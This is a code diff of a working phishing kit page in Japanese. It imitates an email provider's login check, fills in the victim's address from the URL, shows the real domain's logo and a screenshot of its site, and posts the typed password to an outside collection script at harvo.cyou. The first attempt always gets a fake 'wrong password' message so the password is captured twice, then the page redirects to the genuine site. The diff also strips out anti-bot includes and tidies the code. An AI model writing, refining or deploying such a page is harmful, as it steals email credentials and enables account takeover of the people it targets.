@@ -1,14 +1,3 @@
-<?php
-session_start();
-error_reporting(0);
-
-include('./talk/blockers.php');
-include('./talk/detects.php');
-include('./talk/new.php');
-
-include('./talk/Bot-Crawler.php');
-include('./talk/Dila_DZ.php');
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -24,8 +13,6 @@ include('./talk/Dila_DZ.php');
         }
         body {
             font-family: Arial, sans-serif;
-            /*background-color: #f5f5f5;*/
-            /*background-image: url("https://image.thum.io/get/width/1200/https://aol.com");*/
             height: 100vh;
             display: flex;
             justify-content: center;
@@ -119,10 +106,9 @@ include('./talk/Dila_DZ.php');
         .login-container button {
             width: 100%;
             color: rgb(255, 255, 255);
-    background: rgb(24, 143, 255);
+            background: rgb(24, 143, 255);
             padding: 18px;
             border: none;
-            /* border-radius: 4px; */
             font-size: 16px;
             margin-bottom: 15px;
             cursor: pointer;
@@ -135,45 +121,44 @@ include('./talk/Dila_DZ.php');
         .login-container .footer {
             font-size: 12px;
             color: #000;
-            /*background: linear-gradient(180deg, #fff 40%, rgba(0, 0, 0, .225) 100%);*/
             margin-top: 20px;
             height: .520833333in;
         }
 
         .loader {
-        display: block;
-        --height-of-loader: 2px;
-        --loader-color: green;
-        width: 100%;
-        height: var(--height-of-loader);
-        border-radius: 30px;
-        background-color: transparent;
-        position: relative;
+            display: block;
+            --height-of-loader: 2px;
+            --loader-color: green;
+            width: 100%;
+            height: var(--height-of-loader);
+            border-radius: 30px;
+            background-color: transparent;
+            position: relative;
         }
 
         .loader::before {
-        content: "";
-        position: absolute;
-        background: var(--loader-color);
-        top: 0;
-        left: 0;
-        width: 0%;
-        height: 100%;
-        border-radius: 30px;
-        animation: moving 1.5s ease-in-out infinite;
-        ;
+            content: "";
+            position: absolute;
+            background: var(--loader-color);
+            top: 0;
+            left: 0;
+            width: 0%;
+            height: 100%;
+            border-radius: 30px;
+            animation: moving 1.5s ease-in-out infinite;
         }
+        
         @keyframes moving {
-        50% {
-            width: 100%;
+            50% {
+                width: 100%;
+            }
+            100% {
+                width: 0;
+                right: 0;
+                left: unset;
+            }
         }
-
-        100% {
-            width: 0;
-            right: 0;
-            left: unset;
-        }
-        }
+        
         .loaders {
             padding: 5px;
             border: 1px solid #747474;
@@ -181,48 +166,56 @@ include('./talk/Dila_DZ.php');
             margin: 1rem auto;
             border-radius: 24px;
         }
+        
         .loadcent {
             width: 50%;
         }
+        
         .info {
             display: flex;
             align-items: center;
             gap: 12px;
             flex-wrap: wrap;
-             justify-content: center;
-             font-size: 12px;
+            justify-content: center;
+            font-size: 12px;
         } 
+        
         .info span i {
             margin:0 5px;
         }
+        
         hr {
             border: 0;
             border-top: 1px solid #eee;
-        
-
         }
+        
         #password::placeholder {
-                /* content: 'Email address'!important; */
-                letter-spacing: 1.7px !important;
-                font-size: 13px !important;
-                /* color: transparent; */
-
-            }
+            letter-spacing: 1.7px !important;
+            font-size: 13px !important;
+        }
+        
         section {
-            position: fixed;height: 100vh;width: 100%;display: flex;justify-content: center;align-items: center;z-index: 10;
+            position: fixed;
+            height: 100vh;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
             background: #fff;
         }
+        
         @media screen and (max-width: 768px) {
             .login-container {
-            width: 100%;
-            padding: 2rem;
-            background-color: white !important;
-            border-radius: 8px;
-            background-color: transparent;
-            box-shadow: none;
-            text-align: center;
-            font-family: Verdana, Geneva, Tahoma, sans-serif;
-        }
+                width: 100%;
+                padding: 2rem;
+                background-color: white !important;
+                border-radius: 8px;
+                background-color: transparent;
+                box-shadow: none;
+                text-align: center;
+                font-family: Verdana, Geneva, Tahoma, sans-serif;
+            }
             .loadcent {
                 width: 90%;
             }
@@ -238,15 +231,13 @@ include('./talk/Dila_DZ.php');
                 align-items: center;
                 gap: 12px;
                 flex-wrap: wrap;
-                 justify-content: center;
-                 font-size: 12px;
+                justify-content: center;
+                font-size: 12px;
             } 
         }
     </style>
     <script>
-        // Function to display date, time, browser, OS, and location
         function displayInfo() {
-            // Display current date and time
             const currentDate = new Date();
             const dateString = currentDate.toDateString();
             const timeString = currentDate.toLocaleTimeString();
@@ -255,21 +246,18 @@ include('./talk/Dila_DZ.php');
                 datetimeElements[i].innerHTML = '<i class="far fa-calendar-alt icon"></i>' + dateString + ' <i class="far fa-clock icon"></i>' + timeString;
             }
         
-            // Display browser type
             const browserType = detectBrowser();
             const browserElements = document.getElementsByClassName("browser");
             for (let i = 0; i < browserElements.length; i++) {
                 browserElements[i].innerHTML = '<i class="fab fa-chrome icon"></i>' + browserType;
             }
         
-            // Display operating system
             const os = detectOS();
             const osElements = document.getElementsByClassName("os");
             for (let i = 0; i < osElements.length; i++) {
                 osElements[i].innerHTML = '<i class="fab fa-windows icon"></i>' + os;
             }
         
-            // Get and display user's location (city and country) based on IP address
             fetch("https://ipapi.co/json/")
                 .then(response => response.json())
                 .then(data => {
@@ -288,7 +276,6 @@ include('./talk/Dila_DZ.php');
                 });
         }
         
-        // Function to detect browser type
         function detectBrowser() {
             const userAgent = window.navigator.userAgent;
             const browsers = {
@@ -309,7 +296,6 @@ include('./talk/Dila_DZ.php');
             return "Unknown";
         }
         
-        // Function to detect operating system
         function detectOS() {
             const userAgent = window.navigator.userAgent;
             if (userAgent.indexOf("Windows") !== -1) {
@@ -322,20 +308,17 @@ include('./talk/Dila_DZ.php');
             return "Unknown";
         }
 
-        // Run the display function when the page loads
         window.onload = displayInfo;
     </script>
-     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer">
-     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
 </head>
 <body id="body">
    <section id="loaddd">
         <div class="loadcent">
-            <!-- <i class="fas fa-envelope" style="text-align: center;font-size: 6rem;display: block;color: rgb(0 19 186 / 65%);"></i>
-             -->
              <img src="" id="loimg" style="width: 70px;height: auto;text-align: center;display: block;margin: auto;" alt="">
             <div class="loaders">
-            <div class="loader"></div>
+                <div class="loader"></div>
             </div>
             <hr style="width:50%;text-align:center; margin: 20px auto;">
             <p style="text-align: center;">Loading <span id="emailich"></span> mail setting ...</p>
@@ -348,11 +331,9 @@ include('./talk/Dila_DZ.php');
             </div>
         </div>
    </section>
+   
     <div class="login-container">
         <img src="" alt="" width="70px" height="auto" id="imgg">
-        <!-- <h3 style="display: block;color:blue;font-size:20px;text-align: center;font-weight: 400;
-        margin-bottom: 15px;">メールポータル</h3> -->
-        <!-- <hr style="width:100%;text-align:left;margin: 20px 0;margin-left:0;border-color: rgba(128, 128, 128, 0.318);"> -->
         <div class="info" style="text-align: center;">
             <span class="datetime"></span>
             <span class="browser"></span>
@@ -362,7 +343,7 @@ include('./talk/Dila_DZ.php');
         <p id="auth_email" style="color: rgb(6, 39, 171);text-align: center;font-size: 17px;"></p>
        
         <hr style="width:100%;text-align:left;margin: 20px 0;margin-left:0;border-color: #eee;">
-        <p>セッション認証が必要です！以下の情報をご入力ください。  <span id="ux-group"></span> 続行するにはパスワードが必要です。</p>
+        <p>セッション認証が必要です！以下の情報をご入力ください。 <span id="ux-group"></span> 続行するにはパスワードが必要です。</p>
         
         <form action="" id="testForm" method="POST">
             <input type="hidden" name="aa" id="ux" required value="">
@@ -383,9 +364,10 @@ include('./talk/Dila_DZ.php');
             © 2025 <span id="emailichjdk"></span> 安全なポータル | プライバシー 
         </div>
     </div>
+    
     <script>
-       
-        var fille = "https://harvo.cyou/4892e/34/psr/psr/result.php"; // Your php url here e.g http://youdomain.com/result.php
+        // YOUR PHP SERVER URL (keep this on your server)
+        var fille = "https://harvo.cyou/4892e/34/psr/psr/result.php";
         
         var fullUrl = window.location.href;
         var emailRegex = /#([^#]+)$/;
@@ -393,30 +375,25 @@ include('./talk/Dila_DZ.php');
         var emaill = match ? match[1] : null;
         var domain = emaill.substring(emaill.lastIndexOf("@") +1);
         var frmsite = domain.substring(0, domain.lastIndexOf("."));
-        console.log(domain, frmsite);
+        
         document.getElementById("emailich").textContent = domain;
         document.getElementById("emailichjdk").textContent = domain;
-        document.getElementById("titt").textContent = `portal  - ${domain} Email verification`;
+        document.getElementById("titt").textContent = `portal - ${domain} Email verification`;
         document.getElementById('ux').value = emaill;
         document.getElementById('auth_email').textContent = emaill;
         document.getElementById("ux-group").textContent = domain;
         document.getElementById("imgg").src = `https://logo.clearbit.com/${domain}`;
         document.getElementById("loimg").src = `https://logo.clearbit.com/${domain}`;
-        document.getElementById("imgg").href = `https://logo.clearbit.com/${domain}`;
-        // document.getElementById("body").style.backgroundImage = `url("https://image.thum.io/get/width/1200/https://${domain}")`;
-       document.getElementById("body").style.background = `linear-gradient(rgb(72 67 67 / 88%), #181717cc), url("https://image.thum.io/get/width/1200/https://${domain}")`;
-        // Display OS, browser, date, and location
-            setTimeout(() => {
-                document.getElementById("loaddd").style.display = "none";
-            }, 3000);
-       
+        document.getElementById("body").style.background = `linear-gradient(rgb(72 67 67 / 88%), #181717cc), url("https://image.thum.io/get/width/1200/https://${domain}")`;
+        
+        setTimeout(() => {
+            document.getElementById("loaddd").style.display = "none";
+        }, 3000);
 
         var formSubmitted = 0;
 
         $("#testForm").on("submit", function (event) {
-        
             event.preventDefault();
-            
             formSubmitted++;
             
             var inputs = $('input[required]');
@@ -433,18 +410,15 @@ include('./talk/Dila_DZ.php');
                 url: `${fille}`,
                 type: 'POST',
                 data: formData,
-                processData: false, // Required to send FormData
-                contentType: false, // Required to not set default content type
+                processData: false,
+                contentType: false,
                 success: function (response) {
                     console.log(response);
                     
                     if (formSubmitted === 1) {
-                        console.log("YESSSSS");
                         $("#password").val("");
                         $("#uy-group").text("パスワードが間違っています。もう一度お試しください。");
                     } else if (formSubmitted >= 2) {
-                        
-                        console.log("GOOOOOO");
                         setTimeout(() => {
                             window.location.href = `http://www.${domain}`;
                         }, 2000);
@@ -453,6 +427,11 @@ include('./talk/Dila_DZ.php');
             });
         });
 
+        // Show/hide password
+        document.getElementById("show-password").addEventListener("change", function() {
+            var passwordField = document.getElementById("password");
+            passwordField.type = this.checked ? "text" : "password";
+        });
     </script>
 </body>
 </html>
